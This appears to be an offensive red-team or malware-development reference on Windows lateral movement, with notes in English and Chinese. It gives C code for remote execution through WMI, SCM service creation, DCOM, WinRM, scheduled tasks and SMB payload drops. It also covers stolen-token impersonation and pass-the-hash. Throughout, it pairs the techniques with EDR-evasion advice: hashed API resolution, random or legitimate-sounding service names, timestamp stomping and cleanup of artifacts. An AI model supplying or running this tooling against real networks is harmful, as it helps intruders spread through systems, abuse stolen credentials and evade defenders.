# Lateral Movement Techniques

## Overview

横向移动技术，用于从已控主机扩展到目标网络中的其他系统。所有技术均通过 PEB walk + hash 动态解析 API，结合 indirect syscall 最小化检测面。

---

## Technique 1: WMI Remote Execution (Win32_Process.Create)

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (Process Creation on remote host), Event ID 3 (Network Connection)
> ETW: Microsoft-Windows-WMI-Activity
> EDR Hooks: CoCreateInstance, IWbemServices::ExecMethod
> Signature: DCOM traffic on TCP 135 + dynamic RPC port
> Mitigation: Use from process with legitimate WMI usage history; avoid powershell.exe as parent

```c
// WMI remote process creation via COM
// Requires: ole32.dll, oleaut32.dll (COM infrastructure)
// All COM interfaces resolved dynamically

#include <windows.h>

// COM GUIDs as stack-constructed values
// CLSID_WbemLocator: {4590F811-1D3A-11D0-891F-00AA004B2E24}
// IID_IWbemLocator:  {DC12A687-737F-11CF-884D-00AA004B2E24}

typedef struct {
    // IWbemLocator vtable
    void* QueryInterface;
    void* AddRef;
    void* Release;
    void* ConnectServer;
} IWbemLocatorVtbl;

typedef struct {
    IWbemLocatorVtbl* lpVtbl;
} IWbemLocator;

// Resolve COM APIs via PEB walk
typedef long (__stdcall *tCoInitializeEx)(void*, unsigned long);
typedef long (__stdcall *tCoCreateInstance)(const void*, void*, unsigned long, const void*, void**);
typedef long (__stdcall *tCoInitializeSecurity)(void*, long, void*, void*, unsigned long, unsigned long, void*, unsigned long, void*);

void WmiExec(const wchar_t* target, const wchar_t* command) {
    HMODULE hOle32 = EnsureModule(HASH_OLE32);
    
    tCoInitializeEx pCoInit = (tCoInitializeEx)PebGetProc(hOle32, HASH_CoInitializeEx);
    tCoCreateInstance pCoCreate = (tCoCreateInstance)PebGetProc(hOle32, HASH_CoCreateInstance);
    tCoInitializeSecurity pCoSec = (tCoInitializeSecurity)PebGetProc(hOle32, HASH_CoInitializeSecurity);

    pCoInit(NULL, 0x0/*COINIT_MULTITHREADED*/);
    pCoSec(NULL, -1, NULL, NULL, 
           3/*RPC_C_AUTHN_LEVEL_DEFAULT*/, 
           3/*RPC_C_IMP_LEVEL_IMPERSONATE*/,
           NULL, 0/*EOAC_NONE*/, NULL);

    // Build connection string: "\\\\TARGET\\root\\cimv2"
    // Connect → Get Win32_Process → ExecMethod("Create", command)
    // Each step uses COM interface vtable calls
}
```

### WMI Execution Flow
1. `CoInitializeEx` → initialize COM
2. `CoCreateInstance(CLSID_WbemLocator)` → get IWbemLocator
3. `ConnectServer("\\\\TARGET\\root\\cimv2")` → get IWbemServices
4. `GetObject("Win32_Process")` → get process class
5. `GetMethod("Create")` → get input parameters
6. `SpawnInstance` → create parameter instance with CommandLine
7. `ExecMethod("Create")` → execute on remote host

---

## Technique 2: SCM Service Creation (PsExec-style)

> OPSEC: 🔴 High
> Sysmon: Event ID 1, 7 (Image Load), 17/18 (Pipe Create/Connect)
> ETW: Microsoft-Windows-Services, Microsoft-Windows-Security-Auditing (4697)
> EDR Hooks: OpenSCManagerW, CreateServiceW, StartServiceW
> Signature: SMB connection + service creation + named pipe communication
> Mitigation: Use random service name; delete service immediately after execution; avoid ADMIN$ share writes

```c
// Remote service creation via SCM over SMB
// Requires: advapi32.dll
typedef void* SC_HANDLE;

typedef SC_HANDLE (__stdcall *tOpenSCManagerW)(const wchar_t*, const wchar_t*, unsigned long);
typedef SC_HANDLE (__stdcall *tCreateServiceW)(SC_HANDLE, const wchar_t*, const wchar_t*,
    unsigned long, unsigned long, unsigned long, unsigned long,
    const wchar_t*, const wchar_t*, unsigned long*, const wchar_t*, const wchar_t*, const wchar_t*);
typedef int (__stdcall *tStartServiceW)(SC_HANDLE, unsigned long, const wchar_t**);
typedef int (__stdcall *tDeleteService)(SC_HANDLE);
typedef int (__stdcall *tCloseServiceHandle)(SC_HANDLE);

void ScmExec(const wchar_t* target, const wchar_t* binPath) {
    HMODULE hAdv = EnsureModule(HASH_ADVAPI32);
    
    tOpenSCManagerW pOpenSCM = (tOpenSCManagerW)PebGetProc(hAdv, HASH_OpenSCManagerW);
    tCreateServiceW pCreateSvc = (tCreateServiceW)PebGetProc(hAdv, HASH_CreateServiceW);
    tStartServiceW pStartSvc = (tStartServiceW)PebGetProc(hAdv, HASH_StartServiceW);
    tDeleteService pDeleteSvc = (tDeleteService)PebGetProc(hAdv, HASH_DeleteService);
    tCloseServiceHandle pCloseSvc = (tCloseServiceHandle)PebGetProc(hAdv, HASH_CloseServiceHandle);

    // Connect to remote SCM
    SC_HANDLE hSCM = pOpenSCM(target, NULL, 0xF003F/*SC_MANAGER_ALL_ACCESS*/);
    
    // Create service with random name
    // binPath points to uploaded payload or cmd.exe /c command
    SC_HANDLE hSvc = pCreateSvc(hSCM, L"SvcRng01", NULL,
        0xF01FF/*SERVICE_ALL_ACCESS*/,
        0x10/*SERVICE_WIN32_OWN_PROCESS*/,
        0x3/*SERVICE_DEMAND_START*/,
        0x1/*SERVICE_ERROR_NORMAL*/,
        binPath, NULL, NULL, NULL, NULL, NULL);

    // Start and immediately delete
    pStartSvc(hSvc, 0, NULL);
    pDeleteSvc(hSvc);
    pCloseSvc(hSvc);
    pCloseSvc(hSCM);
}
```

---

## Technique 3: DCOM Lateral Movement

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (child process on remote host)
> ETW: Microsoft-Windows-DistributedCOM
> EDR Hooks: CoCreateInstanceEx (remote activation)
> Signature: DCOM traffic on TCP 135 + dynamic port; child process of DllHost.exe or svchost.exe
> Mitigation: Use less-monitored DCOM objects (MMC20.Application, ShellBrowserWindow)

### Common DCOM Objects for Lateral Movement

| Object | ProgID | Method | Parent Process |
|--------|--------|--------|----------------|
| MMC20.Application | `{49B2791A-B1AE-4C90-9B8E-E860BA07F889}` | `Document.ActiveView.ExecuteShellCommand` | mmc.exe |
| ShellWindows | `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}` | `Item().Document.Application.ShellExecute` | explorer.exe |
| ShellBrowserWindow | `{C08AFD90-F2A1-11D1-8455-00A0C91F3880}` | `Document.Application.ShellExecute` | explorer.exe |
| Excel.Application | (varies) | `RegisterXLL` or `DDEInitiate` | excel.exe |

```c
// DCOM remote execution via MMC20.Application
// Uses CoCreateInstanceEx with COSERVERINFO for remote activation

typedef struct {
    unsigned long dwReserved1;
    unsigned long dwReserved2;
    wchar_t*      pwszName;    // target hostname
    void*         pAuthInfo;
} COSERVERINFO;

typedef struct {
    void* pIID;
    void* pItf;
    long  hr;
} MULTI_QI;

typedef long (__stdcall *tCoCreateInstanceEx)(
    const void*, void*, unsigned long, COSERVERINFO*, unsigned long, MULTI_QI*);

void DcomExec(const wchar_t* target, const wchar_t* command) {
    HMODULE hOle32 = EnsureModule(HASH_OLE32);
    tCoCreateInstanceEx pCoCreateEx = (tCoCreateInstanceEx)PebGetProc(hOle32, HASH_CoCreateInstanceEx);

    COSERVERINFO si = {0};
    si.pwszName = (wchar_t*)target;

    // CLSID_MMC20 = {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
    // IID_IDispatch = {00020400-0000-0000-C000-000000000046}
    
    MULTI_QI mqi = {0};
    // mqi.pIID = &IID_IDispatch;
    
    // pCoCreateEx(&CLSID_MMC20, NULL, 0x10/*CLSCTX_REMOTE_SERVER*/, &si, 1, &mqi);
    // Then use IDispatch::Invoke to call Document.ActiveView.ExecuteShellCommand
}
```

---

## Technique 4: WinRM Remote Execution

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (Process Creation via wsmprovhost.exe)
> ETW: Microsoft-Windows-WinRM
> EDR Hooks: WSManCreateSession, WSManRunShellCommand
> Signature: HTTP/HTTPS on port 5985/5986; parent process wsmprovhost.exe
> Mitigation: Blends with legitimate admin traffic if WinRM is already in use

```c
// WinRM execution via WinRM C API (wsmsvc.dll)
// Alternative: Use WinHTTP to send SOAP/WS-Man XML directly

typedef void* WSMAN_API_HANDLE;
typedef void* WSMAN_SESSION_HANDLE;
typedef void* WSMAN_SHELL_HANDLE;
typedef void* WSMAN_COMMAND_HANDLE;

// WinRM API flow:
// 1. WSManInitialize → get API handle
// 2. WSManCreateSession("http://target:5985/wsman") → session
// 3. WSManCreateShell → remote shell
// 4. WSManRunShellCommand(shell, command) → execute
// 5. WSManReceiveShellOutput → get results
// 6. Cleanup: WSManCloseCommand → WSManCloseShell → WSManCloseSession → WSManDeinitialize

// HTTP-based approach (lower footprint):
// Send WS-Man SOAP envelope via WinHTTP to port 5985
// Content-Type: application/soap+xml;charset=UTF-8
// SOAP Action: http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command
```

---

## Technique 5: Remote Scheduled Task

> OPSEC: 🟡 Medium
> Sysmon: Event ID 1 (taskeng.exe/taskhostw.exe as parent)
> ETW: Microsoft-Windows-TaskScheduler
> EDR Hooks: ITaskService::Connect, ITaskFolder::RegisterTask
> Signature: RPC to Task Scheduler service; Event ID 4698 (task created)
> Mitigation: Use legitimate-sounding task names; set task to delete after execution; schedule slight future time

```c
// Remote scheduled task via Task Scheduler COM API
// ITaskService → Connect(target) → GetFolder → RegisterTaskDefinition

// COM interfaces:
// ITaskService:    {2FABA4C7-4DA9-4013-9697-20CC3FD40F85}
// CLSID_TaskSched: {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}

// Flow:
// 1. CoCreateInstance(CLSID_TaskScheduler) → ITaskService
// 2. ITaskService::Connect(target, user, domain, password)
// 3. ITaskService::GetFolder("\\") → ITaskFolder
// 4. ITaskService::NewTask(0) → ITaskDefinition
// 5. Configure ITaskDefinition:
//    - Settings: DeleteExpiredTaskAfter = "PT0S" (immediate delete)
//    - Triggers: TimeTrigger set to Now + 30s
//    - Actions: ExecAction with path to payload
// 6. ITaskFolder::RegisterTaskDefinition(name, def, TASK_CREATE, ...)
```

---

## Technique 6: SMB + File Drop + SCM Combo

> OPSEC: 🔴 High
> Sysmon: Event ID 11 (File Created on ADMIN$), Event ID 1, 4697
> Signature: SMB write to \\target\ADMIN$ + service creation
> Mitigation: Use C$ or custom share instead of ADMIN$; timestamp stomp dropped file; cleanup after execution

### Flow
1. Connect to `\\target\ADMIN$` (or `C$`) via SMB
2. Write payload to `Windows\Temp\svc.exe`
3. Create and start service via SCM pointing to dropped file
4. Delete service + clean up dropped file

```c
// File drop via SMB + service execution
// Combines network file write with SCM service creation

// Step 1: Copy file to remote share
typedef int (__stdcall *tCopyFileW)(const wchar_t*, const wchar_t*, int);
tCopyFileW pCopy = (tCopyFileW)ResolveApi(HASH_KERNEL32, HASH_CopyFileW);

// Build UNC path as stack string
wchar_t dst[] = {'\\','\\','T','A','R','G','E','T','\\','A','D','M','I','N','$',
    '\\','T','e','m','p','\\','s','v','c','.','e','x','e',0};
pCopy(L"payload.exe", dst, 0);

// Step 2: Create + start service (see Technique 2)
// binPath = "C:\\Windows\\Temp\\svc.exe"

// Step 3: Cleanup — delete file + delete service
typedef int (__stdcall *tDeleteFileW)(const wchar_t*);
tDeleteFileW pDel = (tDeleteFileW)ResolveApi(HASH_KERNEL32, HASH_DeleteFileW);
pDel(dst);
```

---

## Authentication Context

横向移动需要有效凭据。常用方式：

| Method | Description | Requirements |
|--------|-------------|--------------|
| Current token | 使用当前进程 token (域用户权限) | 域环境 + 目标主机管理员权限 |
| Token impersonation | 窃取其他进程 token | SeDebugPrivilege / SeImpersonatePrivilege |
| Pass-the-Hash | NTLM hash 直接认证 | NTLM hash (from LSASS / SAM dump) |
| Pass-the-Ticket | Kerberos ticket 注入 | TGT/TGS (from LSASS / ticket cache) |
| Over-Pass-the-Hash | NTLM hash → request Kerberos TGT | NTLM hash + KDC reachable |

### Token-based lateral movement
```c
// Impersonate stolen token before WMI/SCM/DCOM call
typedef int (__stdcall *tImpersonateLoggedOnUser)(void*);
tImpersonateLoggedOnUser pImp = (tImpersonateLoggedOnUser)ResolveApi(HASH_ADVAPI32, HASH_ImpersonateLoggedOnUser);
pImp(hStolenToken);

// Lateral movement call here (WMI/SCM/DCOM/WinRM)

typedef int (__stdcall *tRevertToSelf)(void);
tRevertToSelf pRevert = (tRevertToSelf)ResolveApi(HASH_ADVAPI32, HASH_RevertToSelf);
pRevert();
```

---

## OPSEC Comparison

| Technique | OPSEC | Network Artifacts | Disk Artifacts | Best For |
|-----------|-------|-------------------|----------------|----------|
| WMI | 🟡 | RPC/DCOM | None (in-memory) | Fileless execution |
| SCM/PsExec | 🔴 | SMB + RPC | Service binary (temp) | Reliable, works everywhere |
| DCOM | 🟡 | RPC/DCOM | None | Diverse parent processes |
| WinRM | 🟡 | HTTP(S) 5985/86 | None | Blends with admin traffic |
| Scheduled Task | 🟡 | RPC | Task XML (temp) | Delayed/timed execution |
| SMB + SCM | 🔴 | SMB write + RPC | Dropped binary | Simple, maximum compat |
